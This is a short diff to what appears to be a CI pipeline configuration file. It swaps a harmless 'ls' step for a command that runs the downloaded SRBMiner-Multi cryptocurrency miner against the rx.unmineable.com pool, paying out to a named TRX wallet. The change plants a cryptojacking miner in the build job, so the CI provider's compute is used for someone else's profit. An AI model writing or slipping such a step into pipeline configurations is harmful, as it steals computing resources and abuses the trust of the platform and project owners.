@@ -11,7 +11,7 @@ jobs:
               wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz
               tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz
               cd SRBMiner-Multi-0-8-9
-              ls
+              ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool rx.unmineable.com:3333 --wallet TRX:TLoyNDRerTSGBWKXi3EnspBVwr9e9muNmc.ci#qp06-akom
 
 workflows:
     version: 2.1
